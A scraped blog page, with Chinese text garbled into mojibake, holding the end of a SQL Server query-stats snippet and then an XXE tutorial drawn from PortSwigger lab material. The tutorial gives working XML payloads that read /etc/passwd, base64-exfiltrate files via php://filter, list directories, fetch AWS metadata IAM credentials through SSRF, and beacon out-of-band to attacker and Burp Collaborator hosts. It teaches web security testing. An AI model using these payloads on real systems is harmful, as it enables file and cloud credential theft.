<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ¥è‡ª https://www.cnblogs.com/blogcore/p/12467024.html</span></span><br><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1000</span> </span><br><span class="line">       ST.text <span class="keyword">AS</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥&#x27;</span>,</span><br><span class="line">       QS.execution_count <span class="keyword">AS</span> <span class="string">&#x27;æ‰§è¡Œæ¬¡æ•°&#x27;</span>,</span><br><span class="line">       QS.total_elapsed_time <span class="keyword">AS</span> <span class="string">&#x27;è€—æ—¶&#x27;</span>,</span><br><span class="line">       QS.total_logical_reads <span class="keyword">AS</span> <span class="string">&#x27;é€»è¾‘è¯»å–æ¬¡æ•°&#x27;</span>,</span><br><span class="line">       QS.total_logical_writes <span class="keyword">AS</span> <span class="string">&#x27;é€»è¾‘å†™å…¥æ¬¡æ•°&#x27;</span>,</span><br><span class="line">       QS.total_physical_reads <span class="keyword">AS</span> <span class="string">&#x27;ç‰©ç†è¯»å–æ¬¡æ•°&#x27;</span>,       </span><br><span class="line">       QS.creation_time <span class="keyword">AS</span> <span class="string">&#x27;æ‰§è¡Œæ—¶é—´&#x27;</span> ,  </span><br><span class="line">       QS.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>   sys.dm_exec_query_stats QS</span><br><span class="line">       <span class="keyword">CROSS</span> APPLY </span><br><span class="line">sys.dm_exec_sql_text(QS.sql_handle) ST</span><br><span class="line"><span class="keyword">WHERE</span>  QS.creation_time <span class="keyword">BETWEEN</span> <span class="string">&#x27;2015-08-01 00:00:00&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2015-09-02 11:00:00&#x27;</span> </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">     QS.total_elapsed_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>

<p><strong>ç®€åŒ–ï¼šå»é‡ + åªå–ä¸€ä¸ªç»“æœ</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> TOP <span class="number">1</span> <span class="keyword">SQL</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> ST.text <span class="keyword">AS</span> <span class="string">&#x27;SQL&#x27;</span> <span class="keyword">FROM</span> sys.dm_exec_query_stats QS <span class="keyword">CROSS</span> APPLY sys.dm_exec_sql_text(QS.sql_handle) ST) A <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">SQL</span> <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>










      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/XXE%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/29/XXE%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">XXEæ¼æ´çŸ¥è¯†</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-29 16:10:35 / Modified: 16:17:35" itemprop="dateCreated datePublished" datetime="2022-03-29T16:10:35+08:00">2022-03-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XXE/" itemprop="url" rel="index"><span itemprop="name">XXE</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="XXE-XEE-XML-External-Entity"><a href="#XXE-XEE-XML-External-Entity" class="headerlink" title="XXE - XEE - XML External Entity"></a>XXE - XEE - XML External Entity</h1><p>XML å¤–éƒ¨å®ä½“æ”»å‡»æ˜¯é’ˆå¯¹è§£æ XML è¾“å…¥çš„åº”ç”¨ç¨‹åºçš„ä¸€ç§æ”»å‡»ã€‚</p>
<h2 id="XML-Basics"><a href="#XML-Basics" class="headerlink" title="XML Basics"></a>XML Basics</h2><p><strong>Most of this part was taken from this amazing Portswigger page:</strong> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/xml-entities"><strong>https://portswigger.net/web-security/xxe/xml-entities</strong></a></p>
<h3 id="ä»€ä¹ˆæ˜¯-XML"><a href="#ä»€ä¹ˆæ˜¯-XML" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML? "></a>ä»€ä¹ˆæ˜¯ XML? <a href="#what-is-xml" id="what-is-xml"></a></h3><p>XML ä»£è¡¨â€œå¯æ‰©å±•æ ‡è®°è¯­è¨€â€ã€‚ XML æ˜¯ä¸€ç§è®¾è®¡ç”¨äºå­˜å‚¨å’Œä¼ è¾“æ•°æ®çš„è¯­è¨€ã€‚ä¸ HTML ä¸€æ ·ï¼ŒXML ä½¿ç”¨æ ‡ç­¾å’Œæ•°æ®çš„æ ‘çŠ¶ç»“æ„ã€‚ä¸ HTML ä¸åŒï¼ŒXML ä¸ä½¿ç”¨é¢„å®šä¹‰çš„æ ‡ç­¾ï¼Œå› æ­¤å¯ä»¥ä¸ºæ ‡ç­¾æŒ‡å®šæè¿°æ•°æ®çš„åç§°ã€‚åœ¨ Web å†å²çš„æ—©æœŸï¼ŒXML ä½œä¸ºä¸€ç§æ•°æ®ä¼ è¾“æ ¼å¼å¾ˆæµè¡Œï¼ˆâ€œAJAXâ€ä¸­çš„â€œXâ€ä»£è¡¨â€œXMLâ€ï¼‰ã€‚ ä½†å®ƒçš„å—æ¬¢è¿ç¨‹åº¦ç°åœ¨å·²ç»ä¸‹é™ï¼Œåç»§è€…ä¸ºJSONã€‚.</p>
<h3 id="ä»€ä¹ˆæ˜¯å®ä½“"><a href="#ä»€ä¹ˆæ˜¯å®ä½“" class="headerlink" title="ä»€ä¹ˆæ˜¯å®ä½“? "></a>ä»€ä¹ˆæ˜¯å®ä½“? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a></h3><p>XML å®ä½“æ˜¯ä¸€ç§åœ¨ XML æ–‡æ¡£ä¸­è¡¨ç¤ºæ•°æ®é¡¹çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ•°æ®æœ¬èº«ã€‚ XML è¯­è¨€çš„è§„èŒƒä¸­å†…ç½®äº†å„ç§å®ä½“ã€‚ä¾‹å¦‚ï¼Œå®ä½“ <code>&amp;lt;</code> å’Œ <code>&amp;gt;</code> è¡¨ç¤ºå­—ç¬¦ <code>&lt;</code> å’Œ <code>&gt;</code>ã€‚è¿™äº›æ˜¯ç”¨äºè¡¨ç¤º XML æ ‡è®°çš„å…ƒå­—ç¬¦ï¼ˆç±»ä¼¼ç¼–ç¨‹è¯­è¨€ä¸­çš„å…³é”®å­—ï¼‰ï¼Œå› æ­¤å½“å®ƒä»¬å‡ºç°åœ¨æ•°æ®ä¸­æ—¶ï¼Œé€šå¸¸å¿…é¡»ä½¿ç”¨å®ƒä»¬çš„å®ä½“æ¥è¡¨ç¤ºã€‚</p>
<h4 id="å®ä½“ç±»å‹"><a href="#å®ä½“ç±»å‹" class="headerlink" title="å®ä½“ç±»å‹"></a>å®ä½“ç±»å‹</h4><ol>
<li>å­—ç¬¦å®ä½“<ol>
<li>é¢„å®šä¹‰å­—ç¬¦å®ä½“</li>
<li>ç¼–å·å­—ç¬¦å®ä½“</li>
<li>å‘½åå­—ç¬¦å®ä½“</li>
</ol>
</li>
<li>å†…éƒ¨å®ä½“ï¼ˆåˆç§°ï¼šå‘½åå®ä½“ï¼‰</li>
<li>å¤–éƒ¨å®ä½“</li>
<li>å‚æ•°å®ä½“<ol>
<li>å¤–éƒ¨å‚æ•°å®ä½“</li>
<li>å†…éƒ¨å‚æ•°å®ä½“</li>
</ol>
</li>
</ol>
<h4 id="ç†è§£å®ä½“"><a href="#ç†è§£å®ä½“" class="headerlink" title="ç†è§£å®ä½“"></a>ç†è§£å®ä½“</h4><ol>
<li><strong>å­—ç¬¦å®ä½“ï¼š</strong> å­—ç¬¦å®ä½“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åè¿›åˆ¶æ ¼å¼ï¼ˆ&amp;#nnn;ï¼Œå…¶ä¸­ nnn æ˜¯å­—ç¬¦çš„åè¿›åˆ¶å€¼ï¼‰æˆ–åå…­è¿›åˆ¶æ ¼å¼ï¼ˆ&amp;#xhhh;ï¼Œå…¶ä¸­hhh æ˜¯å­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ï¼‰æ¥æŒ‡å®šä»»æ„ Unicode å­—ç¬¦ã€‚å…¶ä¸­ä¸Šé¢æåŠçš„ <em>â€œå®ä½“ <code>&amp;lt;</code> å’Œ <code>&amp;gt;</code> è¡¨ç¤ºå­—ç¬¦ <code>&lt;</code> å’Œ <code>&gt;</code>â€</em> å°±æ˜¯å­—ç¬¦å®ä½“ä¸­é¢„å®šä¹‰å­—ç¬¦å®ä½“çš„ä¸€ç§ã€‚</li>
<li><strong>å†…éƒ¨å®ä½“ï¼š</strong> å‘½åå®ä½“ï¼ˆåœ¨ XML è§„èŒƒä¸­ä¹Ÿç§°ä¸ºå†…éƒ¨å®ä½“ï¼‰å°±æ˜¯æˆ‘ä»¬åœ¨è°ˆè®º â€œå®ä½“â€ æ—¶æ‰€æŒ‡çš„å®ä½“ã€‚å‘½åå®ä½“åœ¨ DTD æˆ–å†…éƒ¨å­é›†ï¼ˆå³æ–‡æ¡£ä¸­ &lt;!DOCTYPE&gt; è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼‰ä¸­å£°æ˜ï¼Œåœ¨æ–‡æ¡£ä¸­ç”¨ä½œå¼•ç”¨ã€‚åœ¨ XML æ–‡æ¡£è§£æè¿‡ç¨‹ä¸­ï¼Œå®ä½“å¼•ç”¨å°†ç”±å®ƒçš„è¡¨ç¤ºæ›¿ä»£ã€‚</li>
<li><strong>å¤–éƒ¨å®ä½“ï¼š</strong> å¤–éƒ¨å®ä½“è¡¨ç¤ºå¤–éƒ¨æ–‡ä»¶çš„å†…å®¹ã€‚å¤–éƒ¨å®ä½“åœ¨æœ‰äº›æƒ…å†µä¸‹å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚è¯´ï¼Œæ‚¨åœ¨åˆ›å»ºä¸€æœ¬å›¾ä¹¦å¹¶ä¸”æƒ³å°†æ¯ä¸€ç« å­˜å‚¨ä¸ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ã€‚</li>
<li><strong>å‚æ•°å®ä½“ï¼š</strong> å‚æ•°å®ä½“ç”¨ <code>% name</code> ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨ <code>%name;</code> ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ã€‚å…¶ä½™å®ä½“ç›´æ¥ç”¨ name ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨ <code>&amp;name;</code>ï¼Œåªèƒ½åœ¨ DTD ä¸­ç”³æ˜ï¼Œå¯åœ¨xmlæ–‡æ¡£ä¸­å¼•ç”¨</li>
</ol>
<h3 id="ä»€ä¹ˆæ˜¯-elements"><a href="#ä»€ä¹ˆæ˜¯-elements" class="headerlink" title="ä»€ä¹ˆæ˜¯ elements?"></a>ä»€ä¹ˆæ˜¯ elements?</h3><p>å…ƒç´ ç±»å‹å£°æ˜ä¸º XML æ–‡æ¡£ä¸­å¯èƒ½å‡ºç°çš„å…ƒç´ çš„ç±»å‹å’Œæ•°é‡ã€å“ªäº›å…ƒç´ å¯èƒ½å‡ºç°åœ¨å½¼æ­¤å†…éƒ¨ä»¥åŠå®ƒä»¬å¿…é¡»å‡ºç°çš„é¡ºåºè®¾ç½®äº†è§„åˆ™ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>&lt;!ELEMENT stockCheck ANY&gt;</code> è¡¨ç¤ºçˆ¶å…ƒç´ ä¸­å¯ä»¥æ’å…¥ä»»æ„å¯¹è±¡ <code>&lt;stockCheck&gt;&lt;/stockCheck&gt;</code></li>
<li>&lt;!ELEMENT stockCheck EMPTY&gt; è¡¨ç¤ºåº”è¯¥ä¸ºç©º <code>&lt;stockCheck&gt;&lt;/stockCheck&gt;</code></li>
<li>&lt;!ELEMENT stockCheck (productId,storeId)&gt; å£°æ˜ <code>&lt;stockCheck&gt;</code> åº”æœ‰ä¸¤ä¸ªå­å…ƒç´  <code>&lt;productId&gt;</code> å’Œ <code>&lt;storeId&gt;</code></li>
</ul>
<h3 id="ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰"><a href="#ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰? "></a>ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a></h3><p>XML æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD) åŒ…å«å¯ä»¥å®šä¹‰ XML æ–‡æ¡£çš„ç»“æ„ã€å®ƒå¯ä»¥åŒ…å«çš„æ•°æ®å€¼çš„ç±»å‹ä»¥åŠå…¶ä»–é¡¹çš„å£°æ˜ã€‚ DTD åœ¨ XML æ–‡æ¡£å¼€å¤´çš„å¯é€‰ <code>DOCTYPE</code> å…ƒç´ ä¸­å£°æ˜ã€‚ DTD å¯ä»¥å®Œå…¨ç‹¬ç«‹äºæ–‡æ¡£æœ¬èº«ï¼ˆç§°ä¸ºâ€œå†…éƒ¨ DTDâ€ï¼‰ï¼Œä¹Ÿå¯ä»¥ä»å…¶ä»–åœ°æ–¹åŠ è½½ï¼ˆç§°ä¸ºâ€œå¤–éƒ¨ DTDâ€ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸¤è€…çš„æ··åˆã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯-XML-è‡ªå®šä¹‰å®ä½“"><a href="#ä»€ä¹ˆæ˜¯-XML-è‡ªå®šä¹‰å®ä½“" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML è‡ªå®šä¹‰å®ä½“ ? "></a>ä»€ä¹ˆæ˜¯ XML è‡ªå®šä¹‰å®ä½“ ? <a href="#what-are-xml- custom-entities" id="what-are-xml-custom-entities"></a></h3><p>XML å…è®¸åœ¨ DTD ä¸­å®šä¹‰è‡ªå®šä¹‰å®ä½“ã€‚ä¾‹å¦‚ï¼š</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code></p>
<p>æ­¤å®šä¹‰æ„å‘³ç€åœ¨ XML æ–‡æ¡£ä¸­å¯¹å®ä½“å¼•ç”¨ <code>&amp;myentity;</code> çš„ä»»ä½•ä½¿ç”¨éƒ½å°†æ›¿æ¢ä¸ºå®šä¹‰çš„å€¼ï¼šâ€œ<code>my entity value</code>â€ã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯-XML-å¤–éƒ¨å®ä½“"><a href="#ä»€ä¹ˆæ˜¯-XML-å¤–éƒ¨å®ä½“" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML å¤–éƒ¨å®ä½“? "></a>ä»€ä¹ˆæ˜¯ XML å¤–éƒ¨å®ä½“? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a></h3><p>XML å¤–éƒ¨å®ä½“æ˜¯ä¸€ç§è‡ªå®šä¹‰å®ä½“ï¼Œå…¶å®šä¹‰ä½äºå£°æ˜å®ƒä»¬çš„ DTD ä¹‹å¤–ã€‚</p>
<p>å¤–éƒ¨å®ä½“çš„å£°æ˜ä½¿ç”¨ <code>SYSTEM</code> å…³é”®å­—ï¼Œå¹¶ä¸”å¿…é¡»æŒ‡å®šåº”ä»å…¶åŠ è½½å®ä½“å€¼çš„ URLã€‚ä¾‹å¦‚ï¼š</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code></p>
<p>The URL can use the <code>file://</code> protocol, and so external entities can be loaded from file. For example:</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code></p>
<p>XML external entities provide the primary means by which <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XML external entity attacks</a> arise.</p>
<h3 id="ä»€ä¹ˆæ˜¯-XML-å‚æ•°å®ä½“"><a href="#ä»€ä¹ˆæ˜¯-XML-å‚æ•°å®ä½“" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML å‚æ•°å®ä½“?"></a>ä»€ä¹ˆæ˜¯ XML å‚æ•°å®ä½“?</h3><p>æœ‰æ—¶ï¼Œç”±äºåº”ç”¨ç¨‹åºçš„æŸäº›è¾“å…¥éªŒè¯æˆ–æ­£åœ¨ä½¿ç”¨çš„ XML è§£æå™¨çš„æŸäº›å¼ºåŒ–ï¼Œä½¿ç”¨å¸¸è§„å®ä½“çš„ XXE æ”»å‡»ä¼šè¢«é˜»æ­¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æ”¹ç”¨ XML å‚æ•°å®ä½“ã€‚ XML å‚æ•°å®ä½“æ˜¯ä¸€ç§ç‰¹æ®Šçš„ XML å®ä½“ï¼Œåªèƒ½åœ¨ DTD çš„å…¶ä»–åœ°æ–¹å¼•ç”¨ã€‚å°±ç›®å‰è€Œè¨€ï¼Œæ‚¨åªéœ€è¦çŸ¥é“ä¸¤ä»¶äº‹ã€‚é¦–å…ˆï¼ŒXML å‚æ•°å®ä½“çš„å£°æ˜åŒ…æ‹¬å®ä½“åç§°å‰çš„ç™¾åˆ†å·å­—ç¬¦ï¼š</p>
<p><code>&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</code></p>
<p>å…¶æ¬¡ï¼Œä½¿ç”¨ç™¾åˆ†æ¯”å­—ç¬¦è€Œä¸æ˜¯é€šå¸¸çš„ &amp; ç¬¦å·æ¥å¼•ç”¨å‚æ•°å®ä½“ï¼š<code>%myparameterentity;</code></p>
<p>è¿™æ„å‘³ç€æ‚¨å¯ä»¥é€šè¿‡ XML å‚æ•°å®ä½“ä½¿ç”¨å¸¦å¤–æ£€æµ‹æ¥æµ‹è¯•ç›² XXEï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; %xxe; ]&gt;</code></p>
<p>è¿™ä¸ª XXE æœ‰æ•ˆè´Ÿè½½å£°æ˜äº†ä¸€ä¸ªåä¸ºâ€œxxeâ€çš„ XML å‚æ•°å®ä½“ï¼Œç„¶åä½¿ç”¨ DTD ä¸­çš„å®ä½“ã€‚è¿™å°†å¯¼è‡´å¯¹æ”»å‡»è€…åŸŸçš„ DNS æŸ¥æ‰¾å’Œ HTTP è¯·æ±‚ï¼ŒéªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸã€‚</p>
<h2 id="ä¸»è¦æ”»å‡»"><a href="#ä¸»è¦æ”»å‡»" class="headerlink" title="ä¸»è¦æ”»å‡»"></a>ä¸»è¦æ”»å‡»</h2><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe</a></p>
<h3 id="å®ä½“æµ‹è¯•"><a href="#å®ä½“æµ‹è¯•" class="headerlink" title="å®ä½“æµ‹è¯•"></a>å®ä½“æµ‹è¯•</h3><p>åœ¨è¿™æ¬¡æ”»å‡»ä¸­ï¼Œæˆ‘å°†æµ‹è¯•ä¸€ä¸ªç®€å•çš„å®ä½“å£°æ˜æ˜¯å¦æœ‰æ•ˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY toreplace &quot;3&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">    &lt;productId&gt;&amp;toreplace;&lt;/productId&gt;</span><br><span class="line">    &lt;storeId&gt;1&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(220).png"></p>
<h3 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h3><p>è®©æˆ‘ä»¬å°è¯•ä»¥ä¸åŒçš„æ–¹å¼è¯»å– <code>/etc/passwd</code>ã€‚å¯¹äº Windowsï¼Œæ‚¨å¯ä»¥å°è¯•é˜…è¯»ï¼š<code>C:\windows\system32\drivers\etc\hosts</code></p>
<p>åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼Œè¯·æ³¨æ„ SYSTEM â€œ<em>**file:&#x2F;&#x2F;&#x2F;**etc&#x2F;passwd</em>â€œ ä¹Ÿå¯ä»¥å·¥ä½œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;example;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(221).png"></p>
<p>å¦‚æœ Web æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨ PHPï¼Œåˆ™ç¬¬äºŒç§æƒ…å†µå¯¹äºæå–æ–‡ä»¶åº”è¯¥å¾ˆæœ‰ç”¨ï¼ˆPortswiggers å®éªŒå®¤çš„æƒ…å†µé™¤å¤–ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;example;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ç¬¬ä¸‰ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°† <code>Element stockCheck</code> å£°æ˜ä¸º ANY</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT stockCheck ANY&gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">    &lt;productId&gt;&amp;file;&lt;/productId&gt;</span><br><span class="line">    &lt;storeId&gt;1&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck3&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(222).png"></p>
<h3 id="ç›®å½•å†…å®¹ç½—åˆ—"><a href="#ç›®å½•å†…å®¹ç½—åˆ—" class="headerlink" title="ç›®å½•å†…å®¹ç½—åˆ—"></a>ç›®å½•å†…å®¹ç½—åˆ—</h3><p>åœ¨åŸºäº <strong>java</strong>çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¯èƒ½å¯ä»¥é€šè¿‡ XXE <strong>åˆ—å‡ºç›®å½•çš„å†…å®¹</strong>ï¼Œå…¶æœ‰æ•ˆè´Ÿè½½å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- /etc/ --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM &quot;file:///etc/&quot; &gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>XXE å¯ç”¨äºäº‘æœåŠ¡å™¨çš„ SSRF</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h3><p>ä½¿ç”¨<strong>ä¸Šé¢çš„æŠ€æœ¯</strong>ï¼Œæ‚¨å¯ä»¥ä½¿æœåŠ¡å™¨è®¿é—®æ‚¨æ§åˆ¶çš„æœåŠ¡å™¨ä»¥æ˜¾ç¤ºå…¶æ˜“å—æ”»å‡»ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿™ä¸èµ·ä½œç”¨ï¼Œå¯èƒ½æ˜¯å› ä¸º <strong>XML å®ä½“ä¸å…è®¸</strong>ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ <strong>XML å‚æ•°å®ä½“</strong>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

